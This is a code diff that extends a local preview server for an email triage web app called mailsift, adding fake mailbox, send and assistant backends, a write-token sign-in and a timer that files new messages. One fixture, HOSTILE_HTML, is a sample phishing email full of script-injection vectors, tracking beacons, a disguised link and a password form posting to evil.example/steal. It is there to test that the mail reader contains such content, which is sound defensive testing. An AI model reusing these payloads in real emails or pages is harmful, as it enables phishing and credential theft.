@@ -13,6 +13,14 @@
  * a verification code, so that path can be exercised without IMAP. A digest
  * sent this morning is on record, and --failing leaves one mailbox failing to
  * sign in, so the status line and its mailbox sheet have something to say.
+ *
+ * Everything the page can do is stood in for, so it can all be tried: opening
+ * a message reads a made-up body (one of them hostile, to see the reader hold),
+ * actions move rows between pretend folders, "send" goes nowhere and says so
+ * on the console, and the assistant answers from a script. --write-token is
+ * the token that signs in with the right to act (default "write"); with
+ * --token set, signing in with that one gives the read-only page. --arrive N
+ * files a new message every N seconds, to watch the live line work.
  */
 import { mkdtempSync } from 'node:fs';
 import { createServer } from 'node:http';
@@ -21,11 +29,13 @@ import { join } from 'node:path';
 import { DatabaseSync } from 'node:sqlite';
 import { setTimeout as sleep } from 'node:timers/promises';
 import { parseArgs } from 'node:util';
+import type { LiveMessage } from '../src/imap/client.js';
 import type { AttachmentManifest } from '../src/imap/message.js';
+import type { ReadableMessage } from '../src/imap/readable.js';
 import { markDigestSent, type DigestItem } from '../src/services/digest.js';
 import { StateStore, type MailRecord } from '../src/services/state.js';
 import { HEARTBEAT_KEY, type PollStats } from '../src/services/watcher.js';
-import { routeWeb } from '../src/web.js';
+import { routeWeb, type WebBackend } from '../src/web.js';
 
 // The config reader wants mailboxes before it answers. These are fixtures: the
 // names feed the mailbox filter and the provider feeds the "open in" link, and
@@ -45,10 +55,13 @@ const { values } = parseArgs({
     port: { type: 'string', default: '8499' },
     token: { type: 'string', default: '' },
     failing: { type: 'boolean', default: false },
+    'write-token': { type: 'string', default: 'write' },
+    arrive: { type: 'string', default: '0' },
   },
 });
 const port = Number(values.port);
 const token = values.token ?? '';
+const writeToken = values['write-token'] ?? '';
 
 const QQ = { account: 'me@qq.com', accountLabel: 'personal-qq' };
 const GMAIL = { account: 'me@gmail.com', accountLabel: 'work-gmail' };
@@ -207,6 +220,8 @@ const DIGEST: DigestItem[] = [
 
 const dir = mkdtempSync(join(tmpdir(), 'mailsift-preview-'));
 const dbPath = join(dir, 'preview.db');
+// The live line opens its own handle on the configured database: point it here.
+process.env.STATE_DB_PATH = dbPath;
 
 function seed(): void {
   const store = new StateStore(dbPath);
@@ -248,6 +263,9 @@ function seed(): void {
   }
   // A poll finished a few minutes ago, so the status line has something to say.
   store.setMeta(HEARTBEAT_KEY, new Date(Date.now() - 3 * 60_000).toISOString());
+  // The queue starts when the release that has it first opens the database;
+  // these rows are backdated, so move that moment back before them.
+  store.setMeta('attention_since', new Date(Date.now() - 30 * D * 60_000).toISOString());
   store.close();
 
   // markSeen stamps "now"; move each row back to when it is meant to have arrived.
@@ -282,16 +300,196 @@ async function pretendPoll(): Promise<PollStats> {
   return { accountsOk: 2, accountsFailed: 0, fetched: 1, fresh: 1, pushed: 1, queued: 0, spamRescued: 0, failures: [] };
 }
 
+// ---- Stand-ins for the mailbox, the mail server and the model ----
+
+const address = (name: string, mail: string): { name: string; address: string } => ({ name, address: mail });
+
+function readable(partial: Partial<ReadableMessage>): ReadableMessage {
+  return {
+    html: null, htmlOmitted: false, text: '', quoted: '', truncated: false, from: null, to: [], cc: [], replyTo: [],
+    subject: '', date: new Date().toISOString(), messageId: null, inReplyTo: null, references: [],
+    auth: { result: 'none', dkim: null, spf: null, dmarc: null, signedBy: null }, unsubscribe: null, inlineImages: 0,
+    ...partial,
+  };
+}
+
+const PIXEL = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
+
+/** A designed message, the way billing mail looks: tables, colour, a logo, a button. */
+const INVOICE_HTML = `<html><head><style>
+  .wrap{background:#f6f9fc;padding:24px 0;font-family:Helvetica,Arial,sans-serif}
+  .card{background:#ffffff;border-radius:8px;width:560px;margin:0 auto}
+  .btn{background:#635bff;color:#ffffff;text-decoration:none;padding:12px 20px;border-radius:6px;display:inline-block;font-weight:bold}
+  @media (max-width:600px){.card{width:100%!important}}
+</style></head><body><div class="wrap"><table class="card" cellpadding="0" cellspacing="0" width="560" align="center">
+<tr><td style="padding:28px 32px 8px"><img src="https://images.example/stripe-logo.png" width="80" height="34" alt="Stripe"></td></tr>
+<tr><td style="padding:8px 32px;color:#32325d;font-size:22px;font-weight:bold">Invoice #4821 is due in 3 days</td></tr>
+<tr><td style="padding:8px 32px;color:#525f7f;font-size:15px;line-height:24px">Hi there,<br>This is a reminder that invoice <b>#4821</b> for <b>$240.00</b> is due soon. You can pay it from the dashboard or by bank transfer.</td></tr>
+<tr><td style="padding:16px 32px"><table width="100%" cellpadding="8" style="border-top:1px solid #e6ebf1;border-bottom:1px solid #e6ebf1;color:#525f7f;font-size:14px">
+<tr><td>Consulting, October</td><td align="right">$200.00</td></tr><tr><td>Tax</td><td align="right">$40.00</td></tr>
+<tr><td style="color:#32325d;font-weight:bold">Amount due</td><td align="right" style="color:#32325d;font-weight:bold">$240.00</td></tr></table></td></tr>
+<tr><td style="padding:8px 32px 28px"><a class="btn" href="https://dashboard.stripe.com/invoices/in_4821">Pay invoice</a></td></tr>
+<tr><td style="padding:0 32px 28px;color:#8898aa;font-size:12px">Questions? Visit <a href="https://support.stripe.com/">support.stripe.com</a>.
+<img src="https://track.mailer.example/open?id=abc" width="1" height="1" alt=""></td></tr>
+</table></div></body></html>`;
+
+/** Everything a message should not be able to do, in one message. */
+const HOSTILE_HTML = `<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/">
+<script>document.title='pwned';parent.document.body.dataset.pwned='script'</script>
+<link rel="stylesheet" href="https://evil.example/x.css"><base href="https://evil.example/"></head>
+<body onload="parent.document.body.dataset.pwned='onload'">
+<h2>Your domain my-site.example expires in 3 days</h2>
+<p>Auto-renew is off. Renew now to avoid downtime: <a href="https://registrar-renewals.evil.example/login">https://registrar.example/renew</a></p>
+<p><a href="javascript:parent.document.body.dataset.pwned='href'">Renew with one click</a></p>
+<img src="x" onerror="parent.document.body.dataset.pwned='onerror'">
+<img src="https://evil.example/beacon.gif" width="1" height="1">
+<img src="https://evil.example/banner.png" width="300" height="60" alt="banner">
+<form action="https://evil.example/steal" method="post"><input name="password" type="password"><button>Sign in</button></form>
+<iframe src="https://evil.example/frame"></iframe>
+<svg onload="parent.document.body.dataset.pwned='svg'"><script>parent.document.body.dataset.pwned='svgscript'</script></svg>
+<div style="position:fixed;inset:0;background:url(https://evil.example/bg.png)">This layer tries to cover the page.</div>
+<p style="color:#444">Thank you,<br>Registrar</p>
+</body></html>`;
+
+function liveFixture(messageId: string): LiveMessage | undefined {
+  const row = store.getMail(messageId);
+  if (!row) return undefined;
+  const from = address(row.senderName ?? '', row.sender ?? '');
+  const base = {
+    from, to: [address('', row.account)], subject: row.subject ?? '', date: row.mailDate ?? row.createdAt,
+    messageId: row.messageId, references: [],
+  };
+  const flags = { seen: false, flagged: false, answered: false };
+  const folder = row.folder ?? 'INBOX';
+  const subject = row.subject ?? '';
+  if (subject.startsWith('Invoice #4821')) {
+    return { folder, flags, readable: readable({
+      ...base, html: INVOICE_HTML,
+      text: 'Hi there,\n\nThis is a reminder that invoice #4821 for $240.00 is due soon. You can pay it from the dashboard or by bank transfer.\n\nConsulting, October  $200.00\nTax  $40.00\nAmount due  $240.00\n\nPay invoice: https://dashboard.stripe.com/invoices/in_4821',
+      auth: { result: 'pass', dkim: 'pass', spf: 'pass', dmarc: 'pass', signedBy: 'stripe.com' },
+      unsubscribe: 'https://stripe.com/unsubscribe?u=preview',
+    }) };
+  }
+  if (subject.startsWith('Your domain')) {
+    return { folder, flags, readable: readable({
+      ...base, html: HOSTILE_HTML,
+      text: 'Your domain my-site.example expires in 3 days. Auto-renew is off. Renew now: https://registrar.example/renew',
+      auth: { result: 'fail', dkim: 'fail', spf: 'softfail', dmarc: 'fail', signedBy: null },
+      replyTo: [address('', 'billing@other-domain.example')],
+    }) };
+  }
+  if (subject === '周六聚餐？') {
+    return { folder, flags, readable: readable({
+      ...base, cc: [address('小周', 'zhou@example.com'), address('阿林', 'lin@example.com')],
+      text: '大家好，\n\n这周六晚上读书会想一起吃个饭，顺便聊聊下个月的书单。地点还没定，倾向于上次那家云南菜，或者大家有更好的推荐也可以提。\n\n能来的话回复一下，我周四前订位。详情见 https://club.example.com/dinner\n\n读书会',
+      quoted: '在 2026年11月10日 21:14，小周 <zhou@example.com> 写道：\n> 上次那家不错，就是有点吵。\n> 我周六可以。',
+      auth: { result: 'pass', dkim: 'pass', spf: 'pass', dmarc: 'pass', signedBy: 'example.com' },
+    }) };
+  }
+  if (subject.startsWith('Re: PR #61')) {
+    return { folder, flags, readable: readable({
+      ...base, references: ['<thread-pr61@github.com>'],
+      html: `<div dir="ltr"><p><b>@mia</b> requested your review on <a href="https://github.com/acme/app/pull/61">acme/app#61</a>.</p><p>Two comments are still unresolved, and the release goes out tomorrow. Could you take a look before then?</p><blockquote>Fix the retry loop in the uploader and add a test for the timeout path.</blockquote><p style="font-size:12px">You are receiving this because your review was requested.<br><img src="${PIXEL}" width="16" height="16" alt="GitHub"> GitHub</p></div>`,
+      text: '@mia requested your review on acme/app#61.\n\nTwo comments are still unresolved, and the release goes out tomorrow. Could you take a look before then?',
+      auth: { result: 'pass', dkim: 'pass', spf: 'pass', dmarc: 'pass', signedBy: 'github.com' },
+    }) };
+  }
+  // Everything else: a short plain message made from what triage stored.
+  const summary = row.summary ?? '';
+  return { folder, flags, readable: readable({
+    ...base, text: `${summary}\n\n${row.reason ?? ''}`.trim(),
+    html: row.verificationCode ? null : `<div><p>${summary.replace(/[<>&]/g, '')}</p><p>${(row.reason ?? '').replace(/[<>&]/g, '')}</p></div>`,
+  }) };
+}
+
+const backend: Partial<WebBackend> = {
+  read: async (_account, messageId) => { await sleep(350); return liveFixture(messageId); },
+  act: async (account, messageId, action) => {
+    await sleep(300);
+    const row = store.getMail(messageId);
+    const sourceFolder = row?.folder ?? 'INBOX';
+    const destination = action === 'archive' ? 'Archive' : action === 'trash' ? 'Trash' : action === 'inbox' ? 'INBOX' : undefined;
+    return {
+      action, account: account.username, messageId, sourceFolder,
+      ...(destination ? { destinationFolder: destination, destinationIsSpam: false } : {}),
+    };
+  },
+  send: async (account, mail) => {
+    await sleep(700);
+    console.log(`[preview] pretended to send from ${account.username} to ${mail.to.join(', ')}: ${mail.subject}`);
+    const raw = Buffer.from(mail.text);
+    return { messageId: `<sent-${Date.now()}@preview>`, raw, copy: raw, accepted: mail.to, rejected: [] };
+  },
+  appendSent: async () => 'Sent',
+  savesSentCopy: () => true,
+  sending: () => ({ available: true }),
+  assistant: () => true,
+  ask: async (asked, question, options) => {
+    await sleep(900);
+    const zh = /[一-鿿]/.test(question) || options.lang === 'zh-CN';
+    const rows = asked.attention(3);
+    if (!rows.length) return { answer: zh ? '最近没有需要你处理的邮件。' : 'Nothing in the recent mail needs you.', citations: [], considered: 12 };
+    const cite = rows.map((_, n) => `[${n + 1}]`).join('');
+    return {
+      answer: zh
+        ? `目前最要紧的有 ${rows.length} 件：${rows.map((r, n) => `${r.senderName ?? r.sender} 的「${r.subject}」[${n + 1}]`).join('，')}。其余的都可以等一等。`
+        : `${rows.length} things matter most right now: ${rows.map((r, n) => `${r.senderName ?? r.sender} on "${r.subject}" [${n + 1}]`).join('; ')}. The rest can wait ${cite ? '' : ''}.`.replace(' .', '.'),
+      citations: rows.map((r, n) => ({ n: n + 1, key: r.dedupKey })),
+      considered: 26,
+    };
+  },
+  draft: async (input) => {
+    await sleep(800);
+    const zh = /[一-鿿]/.test(`${input.text}${input.instruction ?? ''}`);
+    const said = (input.instruction ?? '').trim();
+    return { draft: zh
+      ? `你好，\n\n谢谢来信。${said ? `关于这件事：${said}。` : '我看过了，这周内给你答复。'}\n\n如果还有需要我提前准备的，请告诉我。\n\n祝好`
+      : `Hi,\n\nThanks for the note. ${said ? `On this: ${said}.` : 'I have read it and will get back to you this week.'}\n\nLet me know if you need anything from me before then.\n\nBest regards` };
+  },
+  testPush: async () => 'sent',
+};
+
+// --arrive N: a new message every N seconds, to watch the live line bring it in.
+const arriveEvery = Number(values.arrive);
+if (Number.isFinite(arriveEvery) && arriveEvery > 0) {
+  let n = 0;
+  setInterval(() => {
+    n += 1;
+    const key = `preview-arrive-${n}`;
+    const critical = n % 3 === 0;
+    store.markSeen(key, GMAIL.account, `Build ${1200 + n} ${critical ? 'failed on main' : 'passed'}`);
+    store.recordOutcome(key, critical ? 'critical' : 'info', critical, {
+      messageId: `<${key}@preview>`, accountLabel: GMAIL.accountLabel, sender: 'ci@builds.example', senderName: 'CI',
+      folder: 'INBOX', category: 'Work', decidedBy: 'llm', mailDate: new Date().toISOString(),
+      summary: critical ? `Build ${1200 + n} failed on main: 3 tests are red.` : `Build ${1200 + n} passed on main.`,
+      reason: critical ? 'The main branch is broken.' : 'Routine success report.',
+    });
+  }, arriveEvery * 1000).unref();
+}
+
 const server = createServer((req, res) => {
   void (async () => {
     try {
       const url = new URL(req.url ?? '/', `http://127.0.0.1:${port}`);
-      const answer = await routeWeb(req, url, token, store, 'preview', { onRefresh: pretendPoll });
+      const answer = await routeWeb(req, url, token, store, 'preview', { onRefresh: pretendPoll, writeToken, backend });
       const headers: Record<string, string> = { 'content-type': answer.contentType };
       if (answer.cookie) headers['set-cookie'] = answer.cookie;
       if (answer.cacheControl) headers['cache-control'] = answer.cacheControl;
       Object.assign(headers, answer.headers);
       if (answer.status === 303) headers['location'] = '/';
+      if (answer.stream) {
+        res.writeHead(answer.status, headers);
+        res.flushHeaders();
+        answer.stream({
+          write: (chunk) => {
+            if (res.writableEnded || res.destroyed) throw new Error('stream closed');
+            res.write(chunk);
+          },
+          onClose: (listener) => { res.once('close', listener); },
+          close: () => { if (!res.writableEnded) res.end(); },
+        });
+        return;
+      }
       res.writeHead(answer.status, headers).end(answer.body);
     } catch (error) {
       console.error('preview request failed:', error);
@@ -301,5 +499,6 @@ const server = createServer((req, res) => {
 });
 
 server.listen(port, '127.0.0.1', () => {
-  console.log(`mailsift web preview: http://127.0.0.1:${port}/` + (token ? ` (token: ${token})` : '') + `\nfixtures: ${dbPath}`);
+  console.log(`mailsift web preview: http://127.0.0.1:${port}/` + (token ? ` (token: ${token})` : '')
+    + (writeToken ? `\nsign in at /signin with "${writeToken}" to act on mail` : '') + `\nfixtures: ${dbPath}`);
 });
